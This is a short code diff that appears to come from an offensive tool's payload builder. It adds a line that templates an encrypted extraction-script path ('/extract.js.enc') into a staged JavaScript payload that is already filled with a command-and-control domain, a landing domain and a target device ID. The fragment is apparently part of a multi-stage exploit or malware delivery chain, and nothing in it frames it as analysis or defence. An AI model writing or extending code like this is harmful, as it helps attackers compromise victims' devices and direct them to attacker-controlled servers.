@@ -6767,6 +6767,7 @@
       pe_main_js_str = pe_main_js_str.replace('__C2_DOMAIN__', self.C2_DOMAIN);
       pe_main_js_str = pe_main_js_str.replace('__LANDING_DOMAIN__', self.LANDING_DOMAIN);
       pe_main_js_str = pe_main_js_str.replace('__DEVICE_ID__', self.DEVICE_ID || '');
+      pe_main_js_str = pe_main_js_str.replace('__EXTRACT_PATH__', self.EXTRACT_PATH || '/extract.js.enc');
       pe_main_js_data = get_cstring(pe_main_js_str);
     } else {
       pe_stage1_js_data = g_pe_stage1_js_data;
